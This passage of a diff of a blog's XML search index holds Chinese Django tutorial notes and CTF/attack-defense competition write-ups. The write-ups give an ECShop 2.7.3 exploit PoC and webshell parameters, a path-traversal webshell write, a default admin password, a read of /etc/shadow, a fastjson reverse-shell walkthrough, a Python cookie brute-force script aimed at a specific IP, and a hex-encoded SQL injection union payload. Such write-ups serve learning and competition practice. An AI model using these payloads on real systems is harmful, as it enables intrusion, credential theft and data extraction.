src="\images\pasted-140.png" alt="upload successful"></p><h2 id="用户登录示例"><a href="#用户登录示例" class="headerlink" title="用户登录示例"></a>用户登录示例</h2><h3 id="在views-py中创建视图"><a href="#在views-py中创建视图" class="headerlink" title="在views.py中创建视图"></a>在views.py中创建视图</h3><p><img src="\images\pasted-142.png" alt="upload successful"> </p><h3 id="配置url"><a href="#配置url" class="headerlink" title="配置url"></a>配置url</h3><p><img src="\images\pasted-143.png" alt="upload successful"></p><h3 id="创建模板index-html"><a href="#创建模板index-html" class="headerlink" title="创建模板index.html"></a>创建模板index.html</h3><p><img src="\images\pasted-144.png" alt="upload successful"></p><h3 id="创建模板login-html"><a href="#创建模板login-html" class="headerlink" title="创建模板login.html"></a>创建模板login.html</h3><p><img src="\images\pasted-145.png" alt="upload successful"></p><h2 id="会话过期时间"><a href="#会话过期时间" class="headerlink" title="会话过期时间"></a>会话过期时间</h2><p><img src="\images\pasted-146.png" alt="upload successful"></p><h2 id="存储session"><a href="#存储session" class="headerlink" title="存储session"></a>存储session</h2><p><img src="\images\pasted-147.png" alt="upload successful"></p><h2 id="使用Redis缓存session"><a href="#使用Redis缓存session" class="headerlink" title="使用Redis缓存session"></a>使用Redis缓存session</h2><p><img src="\images\pasted-148.png" alt="upload successful"><br><br><br><br></p><h1 id="登录认证逻辑"><a href="#登录认证逻辑" class="headerlink" title="登录认证逻辑"></a>登录认证逻辑</h1><p>利用django封装好的authenticate()函数，认证登录<br><img src="\images\pasted-141.png" alt="upload successful"><br>Django防止越权，直接访问127.0.0.1:8000/manage/不允许访问</p><pre><code>from django.contrib.auth.decorators import login_required  @login_required  </code></pre><p>如果想限制某个试图函数必须登录才能访问，则在函数前面加上@login_required即可<br>(记得清除浏览器缓存)</p>]]></content>
+      
       <categories>
-        <category>Django学习笔记</category>
-        <category>1_Django概述</category>
+          
+          <category> Django学习笔记 </category>
+          
+          <category> 2_Django视图 </category>
+          
       </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>django</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[ISCC2018线下赛总结]]></title>
-    <url>%2F2018%2F06%2F26%2FISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93%2F</url>
-    <content type="text"><![CDATA[环境介绍先拿自己靶机，攻下高地，进入公共区域攻防这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的给了一个环境，是Tomcat，开了8080端口 比赛信息是192.168.43.70/whatisyourname/，这里用到了fastjson反序列化漏洞，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ ) fastjson反序列化漏洞参考：https://blog.csdn.net/yaofeino1/article/details/76377080https://github.com/iBearcat/Fastjson-Payloadhttps://github.com/shengqi158/fastjson-remote-code-execute-poc 环境源码下载通过github下载含有漏洞环境的web源代码下载地址直接将war包放到tomcat的webapp目录下，运行tomcat就行： 漏洞复现：通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据{“name”:”feifei”,age:12} ，查看效果：然后根据参考文献找到Test.java文件构造poc(反弹shell)，编译一下生成.class文件base64 encode一下替换name字段，post过去可以看到命令执行成功nc连接上执行命令然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡nc也死活连不上说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点 &lt;(￣ c￣)y▂ξ]]></content>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> django </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>Django学习笔记_1</title>
+      <link href="/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
+      <url>/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/</url>
+      <content type="html"><![CDATA[<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>Django安装：pip install django==1.10.3<br>安装前段框架Bootstrap3，利用其结合Django开发Web页面：  pip install django-bootstrap3<br>使用PyMysql连接mysql数据库：  pip install PyMySQL<br><br><br><br></p><h1 id="Django框架介绍"><a href="#Django框架介绍" class="headerlink" title="Django框架介绍"></a>Django框架介绍</h1><p>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MVT模式。它们各自的职责如下：</p><table><thead><tr><th>层次</th><th>职责</th></tr></thead><tbody><tr><td>模型（Model），即数据存取层</td><td>处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。  </td></tr><tr><td>模板(Template)，即业务逻辑层</td><td>处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。</td></tr><tr><td>视图（View），即表现层</td><td>存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。</td></tr></tbody></table><p>&emsp;&emsp;从以上表述可以看出Django 视图不处理用户输入，而仅仅决定要展现哪些数据给用户，而Django 模板 仅仅决定如何展现Django视图指定的数据。或者说, Django将MVC中的视图进一步分解为 Django视图 和 Django模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得Django的模板可以根据需要随时替换，而不仅仅限制于内置的模板。</p><p>&emsp;&emsp;至于MVC控制器部分，由Django框架的URLconf来实现。URLconf机制是使用正则表达式匹配URL，然后调用合适的Python函数。URLconf对于URL的规则没有任何限制，你完全可以设计成任意的URL风格，不管是传统的，RESTful的，或者是另类的。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作。在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。</p><h2 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a>web框架</h2><p><img src="\images\pasted-71.png" alt="upload successful"></p><h2 id="什么是ORM？"><a href="#什么是ORM？" class="headerlink" title="什么是ORM？"></a>什么是ORM？</h2><p><img src="\images\pasted-72.png" alt="upload successful"></p><h2 id="Django框架"><a href="#Django框架" class="headerlink" title="Django框架"></a>Django框架</h2><p>&emsp;&emsp;目录分开，就必须有机制将他们在内里进行耦合。在Django中，urls、orm、static、settings等起着重要的作用。一个典型的业务流程是如下图所示：<br><img src="\images\pasted-70.png" alt="upload successful"><br>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MTV模式。<br><br><br><br></p><h1 id="Django优点"><a href="#Django优点" class="headerlink" title="Django优点"></a>Django优点</h1><ul><li>强大的数据库功能<br>    用 python 的类继承，几行代码就可以拥有一个丰富、动态的数据库操作接口（API），如果需要，你也能执行 SQL 语句ORM（Object-Relational-Mapping“对象-关系-映射”），它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库。</li><li>自带强大的后台功能<br>    几行代码就让网站拥有一个强大的后台，轻松管理内容。</li><li>优雅的网址<br>    在urls.py中用正则匹配网址，传递到对应的函数。(需要注意的是:正则是一种独立的语法，并不是哪个语言所拥有的。)</li><li>具有模板系统<br>    强大，易扩展的模板系统，设计简易，代码和样式分开设计，更易管理。</li><li>缓存系统<br>&emsp;&emsp;Django和memcached、redis或者其他的缓存系统联用，表现更出色，提高了页面的加载速度。<br>&emsp;&emsp;templates 文件夹views.py 中的函数渲染 templates 中的 Html 模板，得到动态内容的网页，当然可以用缓存来提高速度。</li><li>国际化<br>    完全支持多语言应用，允许你定义翻译的字符，轻松翻译成不同国家的语言。<br><br><br><br></li></ul><h1 id="Django基本操作"><a href="#Django基本操作" class="headerlink" title="Django基本操作"></a>Django基本操作</h1><h2 id="创建项目-test1"><a href="#创建项目-test1" class="headerlink" title="创建项目(test1)"></a>创建项目(test1)</h2><p>django-admin startproject test1<br><img src="\images\pasted-73.png" alt="upload successful"></p><h2 id="创建应用-booktest"><a href="#创建应用-booktest" class="headerlink" title="创建应用(booktest)"></a>创建应用(booktest)</h2><p>python manage.py startapp booktest<br><img src="\images\pasted-74.png" alt="upload successful"></p><h2 id="创建更改的文件-（生成迁移）"><a href="#创建更改的文件-（生成迁移）" class="headerlink" title="创建更改的文件 （生成迁移）"></a>创建更改的文件 （生成迁移）</h2><p>python manage.py makemigrations </p><h2 id="将生成的py文件应用到数据库-（执行迁移）"><a href="#将生成的py文件应用到数据库-（执行迁移）" class="headerlink" title="将生成的py文件应用到数据库 （执行迁移）"></a>将生成的py文件应用到数据库 （执行迁移）</h2><p>python manage.py migrate</p><h2 id="创建一个管理员用户（按提示输入用户名，邮箱，密码）"><a href="#创建一个管理员用户（按提示输入用户名，邮箱，密码）" class="headerlink" title="创建一个管理员用户（按提示输入用户名，邮箱，密码）"></a>创建一个管理员用户（按提示输入用户名，邮箱，密码）</h2><p>python manage.py createsuperuser</p><h2 id="运行（可以指定ip地址和端口号）"><a href="#运行（可以指定ip地址和端口号）" class="headerlink" title="运行（可以指定ip地址和端口号）"></a>运行（可以指定ip地址和端口号）</h2><p>#python manage.py runserver 127.0.0.1:8001</p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>AWD</category>
+          
+          <category> Django学习笔记 </category>
+          
+          <category> 1_Django概述 </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>攻防</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[第三届安恒杯线下赛总结]]></title>
-    <url>%2F2018%2F06%2F26%2F%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1%2F</url>
-    <content type="text"><![CDATA[&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求http://10.0.1.2，并带上自己的token，即可获取flag poc1post方式文件url：http://10.50.%s.2/mobile/index.php参数：url=http://10.0.1.2?token=RCNWBJXQ poc2post方式文件url：http://10.50.33.2/mobile/index.php?m=default&amp;c=auction参数：1=phpinfo() 提示线索1:mobile/themes/default/auction_list.dwt这是一个预留后门，比较叼D盾扫不出来提示线索2:mobile/api/uc.php 任意文件读取(poc 1)根据给出的poc1，我们快速去定位问题文件位置我们从mobile入口文件入手即： mobile/index.php查看内容跟踪文件 看到内容 跟踪apps/目录可以发现3个文件夹 我们首先看到默认文件夹 此时又得到5个文件夹 从第一个common文件夹开始可以看到insert.php中的一个函数 看到关键代码 其中 明显是一个任意文件读取利用脚本： 一句话木马文件(poc 2)防守方法删除预留后门auction_list.dwt文件即可当时官方给出提示：auction_list.dwt文件!upload successful由于此文件用于渲染，直接将小马删除即可 任意写文件防守方法改掉writesth函数名即可定位到mobile/api/uc.php在action数组中发现了一些奇怪的东西最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数不难发现以下关键代码：即：文件名可控文件内容可控即可写入Webshell我们测试运行即可发现我们当前目录下写入sky.php，内容为但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为所以直接写可能无效，应该选择上跳，例如 ../data/sky.php ECShop v2.7.3后台直接getshell防守方法改掉后台密码即可（默认admin admin888） 弱口令本次比赛还有一个漏洞就是ctf用户弱口令cat /etc/shadow得到ctf账户密码123456就因为这个漏洞被dalao全场从头打到尾…]]></content>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> django </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>ISCC2018线下赛总结</title>
+      <link href="/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
+      <url>/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
+      <content type="html"><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>先拿自己靶机，攻下高地，进入公共区域攻防<br>这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的<br>给了一个环境，是Tomcat，开了8080端口<br><img src="\images\pasted-57.png" alt="upload successful"></p><p>比赛信息是192.168.43.70/whatisyourname/，这里用到了<strong>fastjson反序列化漏洞</strong>，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ )<br><img src="\images\pasted-58.png" alt="upload successful"><br><br><br></p><h1 id="fastjson反序列化漏洞参考："><a href="#fastjson反序列化漏洞参考：" class="headerlink" title="fastjson反序列化漏洞参考："></a>fastjson反序列化漏洞参考：</h1><p><a href="https://blog.csdn.net/yaofeino1/article/details/76377080" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/76377080</a><br><a href="https://github.com/iBearcat/Fastjson-Payload" target="_blank" rel="noopener">https://github.com/iBearcat/Fastjson-Payload</a><br><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a><br><br><br><br></p><h1 id="环境源码下载"><a href="#环境源码下载" class="headerlink" title="环境源码下载"></a>环境源码下载</h1><p>通过github下载含有漏洞环境的web源代码<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">下载地址</a><br>直接将war包放到tomcat的webapp目录下，运行tomcat就行：<br><img src="\images\pasted-66.png" alt="upload successful"><br><br><br></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><p>通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据<br><strong>{“name”:”feifei”,age:12}</strong> ，查看效果：<br><img src="\images\pasted-59.png" alt="upload successful"><br>然后根据参考文献找到Test.java文件<br>构造poc(<strong><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">反弹shell</a></strong>)，编译一下<br><img src="\images\pasted-60.png" alt="upload successful"><br>生成.class文件<br><img src="\images\pasted-61.png" alt="upload successful"><br>base64 encode一下<br><img src="\images\pasted-62.png" alt="upload successful"><br>替换name字段，post过去<br><img src="\images\pasted-63.png" alt="upload successful"><br>可以看到命令执行成功<br><img src="\images\pasted-64.png" alt="upload successful"><br>nc连接上执行命令<br><img src="\images\pasted-65.png" alt="upload successful"><br>然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡<br>nc也死活连不上<br>说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点　&lt;(￣ c￣)y▂ξ</p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>AWD</category>
+          
+          <category> CTF </category>
+          
+          <category> AWD </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>攻防</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[hash长度拓展攻击]]></title>
-    <url>%2F2018%2F05%2F08%2Fhash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
-    <content type="text"><![CDATA[Hash Length Extension Attack&emsp;&emsp;总体来说就是我们知道一个加盐的hash值，即使我们不知道盐的具体内容，但只要知道长度就可以随便伪造种带盐的hash（相当于我们控制了明密文） MD5加密原理先介绍一下md5加密的原理 个人理解: md5的过程可以分成填充和压缩的过程 md5 padding(填充)&emsp;&emsp;message padding&emsp;&emsp;length%64=56(8位标识原始长度)填充的时候，将会使用16进制数据：&emsp;~1个\x80&emsp;~N个\0x00 md5 compress(压缩)&emsp;&emsp;message padding length—–&gt;hash&emsp;&emsp;length=N*64(bit) —–&gt;length%64(bit) md5 padding例如我们把admin来hash一下:admin 先hex编码-&gt;61646d696e再填充80不满64bit，填充到第56位（50个00）——为了保证信息的长度为N*64+56(字节)最后数据表示位2800000000000000（8个字节）最终结果为: 61646d6968000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000 什么是Magic number (确定值)代码中的0x67452301L, 0xefcdab89L, 0x98badcfeL, 0x10325476L这4个初始化的number就被称为Magic number或者是md5 iv (md5向量) md5 compress我们发现，无论输入多长的信息，计算出来的问就按hash长度都是固定的(md5有32字节)，这就是因为hash算法是一种压缩算法。Hash设计的时候不要求还原，所以就尽可能的扩大信息对每一位hash值的印象。在计算中，也是通过对每组长度为64bit信息分组进行迭代运算实现的。每一次迭代，都会利用一个初始值与本组中的原始信息做一个复杂的数学运算，而将生成的结果带入到下次的复杂运算中作为初始值我们还是计算admin的md5值。因为不满64bit,所以padding之后也只有64个bit，也就需要计算一轮compress压缩算法。压缩算法完成后产生的心magic number为：A=0x292f2321LB=0xa7a5577aLC=0xe4a8943LD=0xc31f804aL而md5的结果:我们发现其实就是这一轮结果的简单拼接（小端存储数据倒叙） hash长度拓展攻击其实只要知道三点后就能进行攻击： MD5(salt+message)的值 message内容 salt+message长度这样就可以在不知道salt的具体内容下，计算出任意的md5(salt+message+padding+append)值因为salt+message+padding内容是经过填充的，一定是N*64，所以这个部分刚好能完成N轮复杂运算。而他的结果，也就是md5(salt+message+padding)刚好是用来做下一轮运算，也就是m’+padding运算的初始向量。 攻击过程逆向算法很简单 def compute_magic_number(self, md5str): self.A = struct.unpack(&quot;I&quot;, md5str[0:8].decode(&apos;hex&apos;))[0] self.B = struct.unpack(&quot;I&quot;, md5str[8:16].decode(&apos;hex&apos;))[0] self.C = struct.unpack(&quot;I&quot;, md5str[16:24].decode(&apos;hex&apos;))[0] self.D = struct.unpack(&quot;I&quot;, md5str[24:32].decode(&apos;hex&apos;))[0] 由它逆出A=0x292f2321L,B=0xa7a5577aL,C=0xe4a8943L,D=0xc31f804aL根据这4个Magci number，再和扩展的字符串m’(此时的m’要进行padding，padding的长度是len(salt+message+padding+m’))进行md5 compress，最后的结果即md5(salt+message+padding+m’)这样就完成了长度拓展攻击 例题测试实验吧-让我进去抓包改source，Repeater过去发现源码 $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } } 按照源码要求，cookie中要存在变量getmein，而且，要 $COOKIE[“getmein”] === md5($secret . urldecode($username . $password))sample-hash是secret+adminadmin的MD5这里secret相当于盐，我们并不知道，但是我们知道它的长度是15，算上后面admin就是20。数据是admin签名（哈希值）是571580b26c65f306376d4f64e53cb5c7生成的hash是新的签名，设置到cookies的getmein里面把\x换成%后post提交，得到flag]]></content>
+      
+      
+        <tags>
+            
+            <tag> 攻防 </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>第三届安恒杯线下赛总结</title>
+      <link href="/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/"/>
+      <url>/2018/06/26/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%AE%89%E6%81%92%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93-1/</url>
+      <content type="html"><![CDATA[<p>&emsp;&emsp;这次比赛只有一道web环境，用的是ECShop V2.7.3<br><br>&emsp;&emsp;模式是AD攻防，规则很简单（虽然半天才搞明白 ￣﹏￣），让对方的极其请求<a href="http://10.0.1.2，并带上自己的token，即可获取flag" target="_blank" rel="noopener">http://10.0.1.2，并带上自己的token，即可获取flag</a>  <br><br></p><h1 id="poc1"><a href="#poc1" class="headerlink" title="poc1"></a>poc1</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.%s.2/mobile/index.php" target="_blank" rel="noopener">http://10.50.%s.2/mobile/index.php</a><br>参数：url=<a href="http://10.0.1.2?token=RCNWBJXQ" target="_blank" rel="noopener">http://10.0.1.2?token=RCNWBJXQ</a><br><br></p><h1 id="poc2"><a href="#poc2" class="headerlink" title="poc2"></a>poc2</h1><p><strong>post方式</strong><br>文件url：<a href="http://10.50.33.2/mobile/index.php?m=default&amp;c=auction" target="_blank" rel="noopener">http://10.50.33.2/mobile/index.php?m=default&amp;c=auction</a><br>参数：1=phpinfo()<br><br></p><p><strong>提示线索1:</strong><br>mobile/themes/default/auction_list.dwt<br>这是一个预留后门，比较叼D盾扫不出来<br><strong>提示线索2:</strong><br>mobile/api/uc.php<br><br></p><h1 id="任意文件读取-poc-1"><a href="#任意文件读取-poc-1" class="headerlink" title="任意文件读取(poc 1)"></a>任意文件读取(poc 1)</h1><p>根据给出的poc1，我们快速去定位问题文件位置<br>我们从mobile入口文件入手<br>即：  mobile/index.php<br>查看内容<br><img src="\images\pasted-36.png" alt="upload successful"><br>跟踪文件 <img src="\images\pasted-37.png" alt="upload successful"><br>看到内容 <img src="\images\pasted-38.png" alt="upload successful"><br>跟踪apps/目录<br>可以发现3个文件夹 <img src="\images\pasted-39.png" alt="upload successful"><br>我们首先看到默认文件夹 <img src="\images\pasted-40.png" alt="upload successful"><br>此时又得到5个文件夹 <img src="\images\pasted-41.png" alt="upload successful"><br>从第一个common文件夹开始<br>可以看到insert.php中的一个函数 <img src="\images\pasted-42.png" alt="upload successful"><br>看到关键代码 <img src="\images\pasted-43.png" alt="upload successful"><br>其中 <img src="\images\pasted-44.png" alt="upload successful"><br>明显是一个任意文件读取<br>利用脚本： <img src="\images\pasted-45.png" alt="upload successful"><br><br><br></p><h1 id="一句话木马文件-poc-2"><a href="#一句话木马文件-poc-2" class="headerlink" title="一句话木马文件(poc 2)"></a>一句话木马文件(poc 2)</h1><p><strong>防守方法删除预留后门auction_list.dwt文件即可</strong><br>当时官方给出提示：auction_list.dwt文件!<br><a href="\images\pasted-46.png">upload successful</a><br>由于此文件用于渲染，直接将小马删除即可<br><br><br><br></p><h1 id="任意写文件"><a href="#任意写文件" class="headerlink" title="任意写文件"></a>任意写文件</h1><p><strong>防守方法改掉writesth函数名即可</strong><br>定位到mobile/api/uc.php<br>在action数组中发现了一些奇怪的东西<br><img src="\images\pasted-47.png" alt="upload successful"><br>最后一个writesth十分瞩目，一看就应该是主办方留下的功能，我们全局搜索这个writesth函数<br>不难发现以下关键代码：<br><img src="\images\pasted-48.png" alt="upload successful"><br>即：<br>文件名可控<br>文件内容可控<br>即可写入Webshell<br>我们测试<br><img src="\images\pasted-49.png" alt="upload successful"><br>运行即可发现我们当前目录下写入sky.php，内容为<img src="\images\pasted-50.png" alt="upload successful"><br>但是由于当时的环境里，只有data目录有可写全写，而我们默认路径为<br><img src="\images\pasted-51.png" alt="upload successful"><br>所以直接写可能无效，应该选择上跳，例如  ../data/sky.php<br><br><br><br></p><h1 id="ECShop-v2-7-3后台直接getshell"><a href="#ECShop-v2-7-3后台直接getshell" class="headerlink" title="ECShop v2.7.3后台直接getshell"></a><strong><a href="!http://www.haaker.cn/?p=6420">ECShop v2.7.3后台直接getshell</a></strong></h1><p><img src="\images\pasted-52.png" alt="upload successful"><br><img src="\images\pasted-53.png" alt="upload successful"><br><img src="\images\pasted-54.png" alt="upload successful"><br><img src="\images\pasted-55.png" alt="upload successful"><br>防守方法改掉后台密码即可（默认admin admin888）<br><br><br><br></p><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>本次比赛还有一个漏洞就是ctf用户弱口令<br>cat /etc/shadow<br>得到ctf账户密码123456<br>就因为这个漏洞被dalao全场从头打到尾…</p>]]></content>
+      
       <categories>
-        <category>CTF</category>
-        <category>web</category>
+          
+          <category> CTF </category>
+          
+          <category> AWD </category>
+          
       </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[蓝鲸笔记系统writeup]]></title>
-    <url>%2F2018%2F04%2F10%2F%E8%93%9D%E9%B2%B8%E7%AC%94%E8%AE%B0%E7%B3%BB%E7%BB%9Fwriteup%2F</url>
-    <content type="text"><![CDATA[蓝鲸笔记系统给出一个login界面，url看上去似乎有问题http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login感觉像是有文件包含随便尝试一下http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=index果然是文件包含。先随便注册一个账号进去看看，发现 hint:./dbinit.sql 发现了flag字段，flag应该就是在数据库里面了 肯定是文件包含无疑了，相办法读源码 利用php伪协议读源码：php://filter/read=convert.base64-encode/resource=不让读，真尴尬 然后仔细看了看url，猜测这个front是文件夹名，login是文件名http://202.98.28.108:10013/7sghfe673jd3/front/index.php还是拒绝访问… 猜测后台脚本是这样写的:include($action.’/‘.$mode.’.php’)require”$action.’/‘.$mode.’.php’” 成功读出来了！！！login不让读，但是审计index.php的源码时发现common.php，顺便把源码也down下来 代码审计先看一下index.php，并没有发现什么东西在common.php中发现一些定义的函数 御剑扫一下，发现/admin/login.php , /admin/index.php，把源码都down下来在/admin/login.php中发现 /admin/login.php,调用了set_login()函数 /front/common.php中有set_login()函数的定义 来到http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login 跟踪一下这几个函数，这里设置了cookies和session。可以看出来最后set_cookie的值是$uname|$endata$uname是admin。则cookie是 admin|md5(SECURITY_KEY+admin) SECURITY_KEY 是个随机数，每一位是从wh两个字母中随机出来的6位随机数 看一下后台登陆验证 两个函数在common.php中 这里验证了userid和level，如果cookie验证失败，则返回false，level如果是0，也返回false。 但是如果我们没有登陆，直接来到/admin/index.php页面，而且绕过cookie的验证，那么userid和level的默认初始值都是null。在php中，null!==False Truenull!=FalseFalse$null!==false是返回true的。所以只要我们能伪造cookie，就可以绕过验证。 爆破cookie脚本import requests import hashlib import random import string false_tag = &quot;not login!&quot; url = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=index&quot; url_csrf = &quot;http://202.98.28.108:10013/7sghfe673jd3/index.php?action=admin&amp;mode=login&quot; def rand_str(length): return &apos;&apos;.join(random.choice(string.ascii_letters + string.digits) for _ in range(length)) def md5_encode(data): hash = hashlib.md5() hash.update((data + &quot;admin&quot;).encode()) return hash.hexdigest() key = [] for x1 in [&quot;w&quot;,&quot;h&quot;]: for x2 in [&quot;w&quot;,&quot;h&quot;]: for x3 in [&quot;w&quot;,&quot;h&quot;]: for x4 in [&quot;w&quot;,&quot;h&quot;]: for x5 in [&quot;w&quot;,&quot;h&quot;]: for x6 in [&quot;w&quot;,&quot;h&quot;]: key.append(x1+x2+x3+x4+x5+x6) print key s = requests.Session() s.headers = { &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&apos;, &apos;cookie&apos;: &apos;&apos; } for x in key: s.headers[&quot;cookie&quot;] = &quot;uid=admin%7C&quot;+md5_encode(x)#+&quot;;&quot;+&quot;PHPSESSID={}&quot;.format(rand_str(26)) s.headers[&quot;PHPSESSID&quot;] = rand_str(26) print s.headers[&quot;cookie&quot;] result = s.get(url) #print result.content if false_tag in result.content: print &quot;NO&quot;,x else: print &quot;YES&quot; print s.headers print result.content break 发现setpagenumu页面，down下来源码 二次注入发现post的page是用户可以输入但是类型限制了纯数字，应该是没有办法注入 回去审计/admin/index.php 发现数据库里查询的是$page_size,跟踪get_page_size(), get_page_size()函数返回num，也就是index里面的$page_size感觉应该能注入，回去看数据库文件 发现数据库里定义的page是varchar类型标准的脚本代码与数据库类型不匹配利用is_numeric()函数的漏洞(认为0x…是整数)，构造一个二次注入 数据库文件中可以看到一共有四个列 构造注入语句2 union select 1,flag,flag,4 from flags转成十六进制注入即可拿到flag0x3220756e696f6e2073656c65637420312c666c61672c666c61672c342066726f6d20666c616773]]></content>
+      
+      
+        <tags>
+            
+            <tag> 攻防 </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
+      <title>hash长度拓展攻击</title>
+      <link href="/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
+      <url>/2018/05/08/hash%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
